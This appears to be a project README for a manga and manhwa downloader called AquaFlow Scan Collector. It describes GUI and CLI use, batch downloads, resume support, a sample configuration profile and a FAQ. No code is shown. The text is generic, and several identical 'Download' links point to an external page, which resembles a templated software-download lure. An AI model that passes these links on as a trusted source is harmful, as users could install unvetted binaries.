# AquaFlow Scan Collector v2.4.0 - manga downloader 2026

> **AquaFlow Scan Collector is a cross-platform manga and manhwa downloader for Windows, macOS, and Linux, with GUI and CLI operation, batch automation, and resume support in version 2.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Windows,%20macOS,%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henry-miller64/aquaflow-crossplatform-loader-v240?style=flat-square)](https://github.com/henry-miller64/aquaflow-crossplatform-loader-v240)

---

<p align="center">
  <a href="https://henry-miller64.github.io/aquaflow-crossplatform-loader-v240/">
    <img src="https://img.shields.io/badge/Download-AquaFlow%20Scan%20Collector%20Latest-brightgreen?style=for-the-badge" alt="Download AquaFlow Scan Collector">
  </a>
</p>

> **[Direct Download - AquaFlow Scan Collector v2.4.0](https://henry-miller64.github.io/aquaflow-crossplatform-loader-v240/)**

---

[Download Latest Build](https://henry-miller64.github.io/aquaflow-crossplatform-loader-v240/)

---

## Overview

AquaFlow Scan Collector is built to gather manga and manhwa into neatly arranged local archives with as little hand-holding as possible. It gives you a desktop GUI for everyday use and a CLI path for scripted or repeatable runs, so it can fit both casual browsing and automated workflows.

The tool is centered around practical library tasks: grouping chapters into batches, recovering from interrupted downloads, organizing folders, and exporting packaged archives such as CBZ, CBR, and Tar. With multilingual support, metadata injection, and plugin hooks, it can be shaped to match different reading setups and personal preferences.

---

## Key Capabilities

- Two ways to work, with GUI and CLI access
- Batch chapter downloads for longer reading queues
- Resume support for partially completed transfers
- Structured folder organization for local archives
- Metadata injection for orderly library management
- CBZ, CBR, and Tar export formats
- Multilingual support for wider use
- Rate limiting, retry handling, plugin hooks, and theming

---

## Installation

You can clone the repository or fetch the latest packaged build from the project page:

- `git clone https://github.com/henry-miller64/aquaflow-crossplatform-loader-v240.git
- Or use the download link above for a packaged release

Once the files are in place, start the desktop app or invoke the CLI entry point from the project directory based on the workflow you prefer.

---

## Using the App

For GUI usage, open the application, add the manga or manhwa source you want to process, then choose your output and organization settings before starting the job.

For CLI usage, launch the collector from a terminal and provide the target source, output path, and batch options as needed. A typical workflow is:

1. Select a source or list of chapters
2. Set the output format and folder structure
3. Start the download job
4. Resume any interrupted run if needed
5. Review the resulting archive and metadata

---

## Configuration

Settings are usually controlled from the GUI preferences, or through CLI flags and saved profile files when you want repeatable runs.

Example profile structure:

    output_format: cbz
    language: multilingual
    resume: true
    retry_count: 3
    rate_limit: enabled
    theme: default

If you rely on custom plugins or themes, place them in the app's configured extension directory or in the path defined by your local environment.

---

## System Requirements

- Windows, macOS, or Linux
- A supported desktop environment for GUI use
- A terminal shell for CLI use
- Sufficient storage for manga or manhwa archives
- Network access for fetching chapters and metadata
- Permissions to write to the selected output folder

---

## FAQ

**How do I get updates?**  
Use the latest download link above or pull the current source from the repository when a new release is published.

**Can I use the GUI and CLI together?**  
Yes. The project provides both workflows, so you can choose whichever fits your task or switch between them as needed.

**Where are settings stored?**  
Configuration is handled through app preferences, saved profiles, or CLI arguments depending on how you run the tool.

**What should I do if a download stops halfway?**  
Use the resume capability to continue the job instead of starting over, then verify the output folder after completion.

**Why does the app retry or slow down requests?**  
Rate limiting and retry recovery are part of the download workflow to handle unstable connections and source-side restrictions more gracefully.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
